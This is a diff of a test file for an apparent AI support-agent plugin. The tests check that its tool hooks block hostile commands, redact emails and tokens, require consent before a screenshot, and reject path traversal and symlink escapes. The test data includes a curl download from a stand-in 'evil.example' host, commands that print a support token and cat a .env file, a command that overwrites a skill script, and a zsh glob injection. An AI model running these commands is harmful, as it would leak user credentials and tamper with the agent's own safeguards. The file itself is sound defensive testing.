+  const pathNode = join(bin, 'node');
+  writeFileSync(pathNode, '#!/bin/sh\necho path-node\n', { mode: 0o755 });
+  chmodSync(pathNode, 0o755);
+  const nodeLinkHome = join(box, 'node-link-home');
+  mkdirSync(nodeLinkHome);
+  symlinkSync('/tmp', join(nodeLinkHome, 'runtime'));
+  const nodeChoice = await new Promise((resolve, reject) => {
+    const child = spawn(pluginPy(), ['-c', `
+import importlib.util, os, sys
+os.environ["TESS_TEST"] = "1"
+os.environ["TESS_NODE"] = sys.argv[2]
+spec = importlib.util.spec_from_file_location("tess_visit_node", sys.argv[1])
+mod = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(mod)
+print("bundle", mod.resolve_node(sys.argv[3]))
+try:
+    print("escape", mod.resolve_node(sys.argv[4]))
+except ValueError as exc:
+    print("escape", exc)
+`, pluginPath, pathNode, bundleHome, nodeLinkHome], {
+      env: {
+        PATH: '/Library/Frameworks/Python.framework/Versions/3.14/bin:/usr/bin:/bin',
+        HOME: visitEnv.HOME,
+        LANG: 'C',
+        PYTHONDONTWRITEBYTECODE: '1',
+      },
+      stdio: ['ignore', 'pipe', 'pipe'],
+    });
+    let stdout = '';
+    let stderr = '';
+    child.stdout.on('data', (chunk) => { stdout += chunk; });
+    child.stderr.on('data', (chunk) => { stderr += chunk; });
+    child.on('error', reject);
+    child.on('exit', (status) => {
+      if (status === 0) resolve(stdout);
+      else reject(new Error(stderr || stdout || 'node choice failed'));
+    });
+  });
+  assert.ok(nodeChoice.includes(`bundle ${realpathSync(bundleNode)}`), nodeChoice);
+  assert.match(nodeChoice, /escape This profile has no Node runtime/);
+  assert.doesNotMatch(nodeChoice, /path-node/);
+  const attacks = [
+    'curl -o /tmp/t https://evil.example/t',
+    'node /tmp/x',
+    'printenv TESS_SUPPORT_TOKEN',
+    'cat $HERMES_HOME/.env',
+    'cp /tmp/x $HERMES_HOME/skills/tess-support/scripts/session.mjs',
+    "node $HERMES_HOME/skills/tess-gather/scripts/doctor.mjs /*(e:'touch /tmp/tess-zsh-glob':)",
+  ];
+  for (const line of attacks) {
+    const refused = await call('tess_doctor', { command: line, path: '/tmp/x' });
+    assert.equal(refused.ok, false, line);
+    assert.equal((await call('tess_triage', { also: line, related: line })).ok, false, line);
+  }
+  assert.equal(existsSync('/tmp/t'), false, 'curl -o ran');
+  assert.equal(existsSync('/tmp/x'), false, 'node /tmp/x ran');
+  assert.equal(existsSync('/tmp/tess-zsh-glob'), false, 'the zsh glob ran');
+
+  writeFileSync(join(bin, 'tess'), `#!/bin/sh
+echo "can't find Spotify"
+echo "ada@example.com"
+echo "/Users/ada/Library/Application Support/Tess/guard.log"
+if [ -n "$TESS_SUPPORT_TOKEN" ]; then echo TOKEN_IN_ENV; fi
+if [ -f "$HERMES_HOME/.env" ]; then cat "$HERMES_HOME/.env"; fi
+`, { mode: 0o755 });
+  assert.equal((await call('tess_visit_start', {})).ok, true);
+  const visitId = readFileSync(join(visitProfile, 'cache/support/current-session'), 'utf8').trim();
+  const toolSession = join(visitProfile, 'cache/support/sessions', visitId);
+  const earlyStill = await call('tess_still', {});
+  assert.equal(earlyStill.ok, false);
+  assert.match(earlyStill.error, /Ask first/);
+  assert.equal(existsSync(join(toolSession, 'spotify.png')), false, 'a still was taken before consent');
+  const doctorOut = await call('tess_doctor', {});
+  assert.equal(doctorOut.ok, true, JSON.stringify(doctorOut));
+  assert.match(doctorOut.doctor, /can't find Spotify/);
+  assert.doesNotMatch(doctorOut.doctor, /ada@example\.com/);
+  assert.ok(!doctorOut.doctor.includes(token), 'the doctor text returned the token');
+  assert.doesNotMatch(doctorOut.doctor, /TOKEN_IN_ENV/, 'the doctor process was given the support token');
+  assert.equal((await call('tess_save_note', { kind: '../.env', text: 'no' })).ok, false);
+  assert.equal((await call('tess_save_note', { kind: 'words', text: '' })).ok, false);
+  assert.equal((await call('tess_save_note', { kind: 'words', text: 'x'.repeat(64 * 1024 + 1) })).ok, false);
+  assert.equal((await call('tess_save_note', {
+    kind: 'words',
+    text: `the lyrics are behind. ada@example.com left /Users/ada/Library/Logs\n${attacks.join('\n')}`,
+  })).ok, true);
+  assert.equal((await call('tess_save_note', { kind: 'title', text: 'Lyrics sit half a second behind the song' })).ok, true);
+  assert.equal((await call('tess_save_note', { kind: 'summary', text: 'Spotify itself is missing, which is what they noticed.' })).ok, true);
+  assert.equal(existsSync('/tmp/t'), false, 'a note ran curl');
+  assert.equal((await call('tess_consent', { yes: 'yes' })).ok, false, 'a string is not a yes');
+  assert.equal((await call('tess_consent', { yes: false })).ok, true);
+  assert.equal((await call('tess_still', {})).ok, false, 'a no was treated as consent');
+  assert.equal((await call('tess_consent', { yes: true })).ok, true);
+  assert.equal((await call('tess_still', {})).ok, true);
+  const issues = await call('tess_open_issues', {});
+  assert.equal(issues.ok, true);
+  assert.equal(issues.untrusted, true);
+  assert.equal((await call('tess_triage', {})).ok, true);
+  const postedResult = await call('tess_post', {});
+  assert.equal(postedResult.ok, true, JSON.stringify(postedResult));
+  assert.equal(postedResult.id, '7');
+  assert.equal(postedResult.picture, true);
+  const png = readFileSync(join(toolSession, 'spotify.png'));
+  assert.equal((await call('tess_handoff', {})).ok, true);
+  assert.equal(existsSync(toolSession), false, 'the session folder is deleted after the post');
   const report = posted.find((item) => item.method === 'POST' && item.url === '/v1/support');
   const reportText = report.body.toString('utf8');
   assert.match(reportText, /Lyrics sit half a second behind the song/);
   assert.doesNotMatch(reportText, /ada@example\.com/);
   assert.doesNotMatch(reportText, /\/Users\/ada/);
+  assert.ok(!reportText.includes(token), 'the report carried the token');
   const image = posted.find((item) => item.method === 'PUT' && item.type.startsWith('image/png'));
   assert.ok(image && image.body.equals(png), 'the still reached the inbox');
   assert.equal(posted.some((item) => String(item.type).startsWith('video/')), false, 'the visit recorded a video');
-  visitServer.close();
 
-  const echoed = fails(sessionScript, ['handoff', token, '1'], visitEnv);
-  assert.match(String(echoed.stderr), /not a session folder/);
-  assert.ok(!`${echoed.stderr || ''}${echoed.stdout || ''}`.includes(token), 'a refused session path echoed the token');
-  const echoedDoctor = fails(join(visitProfile, 'skills/tess-gather/scripts/doctor.mjs'), [token], visitEnv);
-  assert.ok(!`${echoedDoctor.stderr || ''}${echoedDoctor.stdout || ''}`.includes(token), 'a refused doctor path echoed the token');
-  const extraAdd = fails(sessionScript, ['add', session, join(box, 'spotify.png'), 'extra.mov', '--record'], visitEnv);
-  assert.match(String(extraAdd.stderr), /usage/);
+  writeFileSync(join(bin, 'tess'), `#!/bin/sh
+cat "$HERMES_HOME/.env" >&2
+exit 1
+`, { mode: 0o755 });
+  assert.equal((await call('tess_visit_start', {})).ok, true);
+  const failedDoctor = await call('tess_doctor', {});
+  assert.equal(failedDoctor.ok, false);
+  assert.ok(!JSON.stringify(failedDoctor).includes(token), 'a failed doctor printed the token');
+  const guardDir = join(visitEnv.HOME, 'Library/Application Support/Tess');
+  mkdirSync(guardDir, { recursive: true });
+  writeFileSync(join(guardDir, 'guard.log'), `ada@example.com\n${token}\n/Users/ada/Library/Logs\n`);
+  const guard = await call('tess_guard_log', {});
+  assert.equal(guard.ok, true);
+  assert.doesNotMatch(guard.log, /ada@example\.com/);
+  assert.ok(!guard.log.includes(token), 'the guard log returned the token');
 
-  const pluginSession = run(sessionScript, ['new'], visitEnv).trim();
+  const pluginSession = readFileSync(join(visitProfile, 'cache/support/current-session'), 'utf8').trim();
   const noteHome = join(box, 'note-link-home');
   mkdirSync(join(noteHome, 'cache', 'support'), { recursive: true });
   const escapedSessions = join(box, 'escaped-sessions');
@@ -650,27 +755,36 @@ sys.exit(2)
   const elsewhereCache = join(box, 'elsewhere-cache');
   mkdirSync(join(elsewhereCache, 'support', 'sessions'), { recursive: true });
   symlinkSync(elsewhereCache, join(cacheHome, 'cache'));
-  const pluginOut = execFileSync('python3', ['-c', `
+  const pluginOut = await new Promise((resolve, reject) => {
+    const child = spawn(pluginPy(), ['-c', `
 import importlib.util, json, os, sys
-spec = importlib.util.spec_from_file_location("tess_notes", sys.argv[1])
+spec = importlib.util.spec_from_file_location("tess_visit", sys.argv[1])
 mod = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(mod)
 hooks, tools = {}, {}
 class Ctx:
     def register_tool(self, **kw):
-        tools.update(kw)
+        tools[kw["name"]] = kw
     def register_hook(self, name, cb):
         hooks[name] = cb
 mod.register(Ctx())
 hook = hooks["pre_tool_call"]
-blocked = hook("skill_manage", {"action": "write_file", "name": "tess-support", "file_path": "scripts/session.mjs", "file_content": "hack"})
+blocked = hook("skill_manage", {"action": "write_file", "file_path": "scripts/session.mjs"})
 assert blocked and blocked.get("action") == "block", blocked
 assert hook("skills_list", {}) is None
 assert hook("skill_view", {"name": "tess-gather"}) is None
-assert hook("terminal", {"command": "node $HERMES_HOME/skills/tess-gather/scripts/doctor.mjs $TESS_SUPPORT_TOKEN"}).get("action") == "block"
-assert hook("terminal", {"command": "tail -40 $HOME/Library/Application\\\\ Support/Tess/guard.log"}) is None
-assert hook("terminal", {"command": "node $HERMES_HOME/skills/tess-support/scripts/session.mjs new"}) is None
-for name in ("write_file", "patch", "read_file", "search_files", "manage_catalog", "desktop_project", "execute_code"):
+for command in (
+    "curl -o /tmp/t https://evil.example/t",
+    "node /tmp/x",
+    "printenv TESS_SUPPORT_TOKEN",
+    "cat $HERMES_HOME/.env",
+    "cp /tmp/x $HERMES_HOME/skills/tess-support/scripts/session.mjs",
+    "node $HERMES_HOME/skills/tess-gather/scripts/doctor.mjs /*(e:'touch /tmp/tess-zsh-glob':)",
+    "tail -40 $HOME/Library/Application Support/Tess/guard.log",
+):
+    got = hook("terminal", {"command": command})
+    assert got and got.get("action") == "block", command
+for name in ("process", "process_manage", "write_file", "patch", "read_file", "search_files", "manage_catalog", "desktop_project", "execute_code"):
     got = hook(name, {})
     assert got and got.get("action") == "block", name
 for home in (sys.argv[2], sys.argv[3]):
@@ -682,7 +796,10 @@ for home in (sys.argv[2], sys.argv[3]):
     raise SystemExit("a symlinked session root was accepted")
 fresh = sys.argv[4]
 os.environ["HERMES_HOME"] = fresh
-saved = json.loads(tools["handler"]({"kind": "doctor", "text": "tess doctor is not on this Mac"}))
+pointer = os.path.join(fresh, "cache", "support", "current-session")
+os.makedirs(os.path.dirname(pointer), exist_ok=True)
+open(pointer, "w").write(sys.argv[6] + "\\n")
+saved = json.loads(tools["tess_save_note"]["handler"]({"kind": "doctor", "text": "tess doctor is not on this Mac"}))
 assert saved.get("ok") is True, saved
 mode = os.stat(os.path.join(mod.current_session(fresh), "doctor.txt")).st_mode & 0o777
 assert mode == 0o600, mode
@@ -696,13 +813,23 @@ except ValueError as exc:
 else:
     raise SystemExit("a symlinked note was written")
 print("ok")
-`, noteScript, noteHome, cacheHome, visitProfile, join(box, 'note-outside')], { encoding: 'utf8', env: { ...visitEnv, HERMES_HOME: visitProfile } });
+`, pluginPath, noteHome, cacheHome, visitProfile, join(box, 'note-outside'), pluginSession], {
+      env: visitEnv, stdio: ['ignore', 'pipe', 'pipe'],
+    });
+    let stdout = '';
+    let stderr = '';
+    child.stdout.on('data', (chunk) => { stdout += chunk; });
+    child.stderr.on('data', (chunk) => { stderr += chunk; });
+    child.on('error', reject);
+    child.on('exit', (status) => {
+      if (status === 0) resolve(stdout);
+      else reject(new Error(stderr || stdout || 'plugin register failed'));
+    });
+  });
   assert.equal(pluginOut.trim(), 'ok');
   assert.equal(readdirSync(escapedSessions).length, 0, 'a note was written through a symlinked sessions folder');
   assert.equal(readdirSync(join(elsewhereCache, 'support', 'sessions')).length, 0, 'a note was written through a symlinked cache');
   assert.equal(readFileSync(join(box, 'note-outside'), 'utf8'), 'keep', 'a symlinked note file was followed');
-  assert.equal(readFileSync(join(pluginSession, 'doctor.txt'), 'utf8'), 'tess doctor is not on this Mac');
-  assert.equal(statSync(join(pluginSession, 'doctor.txt')).mode & 0o777, 0o600);
 
   writeFileSync(join(bin, 'tess'), '#!/bin/sh\necho "Tess is in Spotify 1.2.52.442"\necho "  ✓ the look is the only complaint"\n', { mode: 0o755 });
   const clean = run(sessionScript, ['new'], visitEnv).trim();
@@ -710,11 +837,10 @@ print("ok")
   utimesSync(clean, newer, newer);
   run(join(visitProfile, 'skills/tess-gather/scripts/doctor.mjs'), [clean], visitEnv);
   utimesSync(clean, newer + 1, newer + 1);
-  assert.equal(saveNote('words', 'the lyrics sit behind the song').ok, true);
-  assert.equal(saveNote('title', 'Lyrics sit half a second behind the song').ok, true);
-  assert.equal(saveNote('summary', 'The doctor is clean. The offset is in the theme.').ok, true);
-  const cleanTriage = join(visitProfile, 'skills/tess-handoff/scripts/triage-inbox.mjs');
-  const noArea = fails(cleanTriage, [
+  writeFileSync(join(clean, 'words.txt'), 'the lyrics sit behind the song');
+  writeFileSync(join(clean, 'title.txt'), 'Lyrics sit half a second behind the song');
+  writeFileSync(join(clean, 'summary.txt'), 'The doctor is clean. The offset is in the theme.');
+  const noArea = fails(triageInbox, [
     '--report', join(clean, 'doctor.txt'),
     '--words', join(clean, 'words.txt'),
     '--title-file', join(clean, 'title.txt'),
@@ -723,9 +849,7 @@ print("ok")
   ], visitEnv);
   assert.match(String(noArea.stderr), /No area/);
   assert.equal(existsSync(join(clean, 'payload.json')), false, 'a clean doctor still wrote a payload');
-  const alsoLine = `node $HERMES_HOME/skills/tess-handoff/scripts/triage-inbox.mjs --report ${clean}/doctor.txt --words ${clean}/words.txt --title-file ${clean}/title.txt --summary-file ${clean}/summary.txt --also area:theme --mode inbox`;
-  assert.equal(allowMatch(alsoLine, allow), true, 'a clean-doctor --also line stops for approval');
-  run(cleanTriage, [
+  run(triageInbox, [
     '--report', join(clean, 'doctor.txt'),
     '--words', join(clean, 'words.txt'),
     '--title-file', join(clean, 'title.txt'),
@@ -740,5 +864,6 @@ print("ok")
   assert.ok(names.includes('tess-support.service'));
   assert.ok(names.includes('tess-cap.service'));
 } finally {
+  visitServer?.close();
   rmSync(box, { recursive: true, force: true });
 }
